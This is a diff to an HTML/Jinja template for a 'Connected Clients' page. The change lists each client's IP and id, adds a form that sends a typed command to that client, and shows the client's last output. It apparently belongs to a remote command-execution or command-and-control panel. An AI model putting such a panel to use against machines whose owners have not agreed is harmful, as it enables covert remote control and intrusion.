@@ -6,14 +6,17 @@
 <body>
   <h1>Connected Clients</h1>
   <ul>
-    {% for client in clients %}
+    {% for client_id, client in clients.items() %}
     <li>
-      {{ client }}
-      <form action="/send/{{ client }}" method="post" style="display:inline;">
+      <strong>{{ client.ip }}</strong> ({{ client_id }})
+      <form action="/send/{{ client_id }}" method="post" style="display:inline;">
         <input name="cmd" placeholder="Command">
         <button type="submit">Send</button>
       </form>
+      <br><strong>Last Output:</strong>
+      <pre>{{ client.output }}</pre>
     </li>
+    <hr>
     {% endfor %}
   </ul>
 </body>
